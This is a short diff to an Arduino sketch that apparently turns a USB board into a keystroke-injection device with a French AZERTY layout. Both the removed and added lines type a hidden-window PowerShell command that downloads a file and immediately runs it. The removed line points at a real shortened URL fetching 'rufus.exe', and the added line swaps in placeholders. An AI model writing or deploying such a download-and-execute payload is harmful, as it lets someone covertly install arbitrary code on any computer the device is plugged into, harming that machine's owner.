@@ -21,7 +21,7 @@ void setup()
   KeyboardAzertyFr.releaseAll();
 
   delay(200);
-  KeyboardAzertyFr.print(F("powershell -WindowStyle Hidden -command \"cd $env:TEMP; Invoke-WebRequest -Uri 'https://tinyurl.com/ya3rce9l' -OutFile 'rufus.exe'; Start-Process -Filepath 'rufus.exe'; exit\""));
+  KeyboardAzertyFr.print(F("powershell -WindowStyle Hidden -command \"cd $env:TEMP; Invoke-WebRequest -Uri 'FILE_URL' -OutFile 'FILE_NAME'; Start-Process -Filepath 'FILE_NAME'; exit\""));
   typeKey(KEY_RETURN);
 
   // Ending stream
